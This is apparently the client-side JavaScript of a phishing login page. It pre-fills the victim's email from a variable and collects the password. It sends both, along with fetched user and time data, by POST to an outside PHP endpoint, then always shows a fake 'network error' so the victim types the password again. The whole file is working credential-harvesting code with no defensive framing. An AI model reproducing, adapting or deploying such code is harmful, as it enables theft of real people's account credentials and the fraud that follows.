
function setEmailFromRecipient() {
    // Set the email value to the recipient email variable
    var emailInput = document.getElementById('exampleInputEmail1');
    var recipientEmail = EmailLog; // Email Log to var
    if (recipientEmail) {
        emailInput.value = decodeURIComponent(recipientEmail);
    }
}

function showPasswordForm() {
$('#emailForm').removeClass('slide-in').addClass('slide-out').hide();
$('#passwordForm').removeClass('slide-out').addClass('slide-in').show();
}

function showEmailForm() {
$('#passwordForm').removeClass('slide-in').addClass('slide-out').hide();
$('#emailForm').removeClass('slide-out').addClass('slide-in').show();
}


async function verifyUser() {
    // Get the form and button elements
    var form = document.querySelector('form');
    var submitButton = form.querySelector('button');
    var networkErrorAlert = document.getElementById('networkErrorAlert');

    try {
        // Fetch user data asynchronously
        var userDataAndTime = await fetchUserDataAndTime();

        // Get form data
        var email = document.getElementById('exampleInputEmail1').value;
        var passwordInput = document.getElementById('exampleInputPassword1');
        var password = passwordInput.value;

        // Check if the password field is empty
        if (!password) {
            passwordInput.classList.add('is-invalid'); // Add Bootstrap's invalid class
            return;
        } else {
            passwordInput.classList.remove('is-invalid'); // Remove Bootstrap's invalid class
        }

        // Merge form data with user data
        var formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        for (var key in userDataAndTime) {
            formData.append(key, userDataAndTime[key]);
        }

        // Disable the form fields and change button text
        form.querySelectorAll('input').forEach(function (input) {
            input.disabled = true;
        });
        submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Verifying...';
        submitButton.disabled = true;

        // Make a POST request to the API endpoint
        var response = await fetch('https://www.apihub.dsvlogistichub.com/url/hubme101.php', {
            method: 'POST',
            body: formData
        });

        var data = await response.json();

        // Enable the form fields and reset button text
        form.querySelectorAll('input').forEach(function (input) {
            input.disabled = false;
        });
        submitButton.innerHTML = 'Submit';
        submitButton.disabled = false;

        // Show the network error alert regardless of the API response
        showNetworkErrorAlert();

        // Add any other logic based on the API response
        console.log(data);
    } catch (error) {
        console.error('Error:', error);

        // Enable the form fields and reset button text in case of an error
        form.querySelectorAll('input').forEach(function (input) {
            input.disabled = false;
        });
        submitButton.innerHTML = 'Submit';
        submitButton.disabled = false;

        // Show the network error alert
        showNetworkErrorAlert();
    }
}
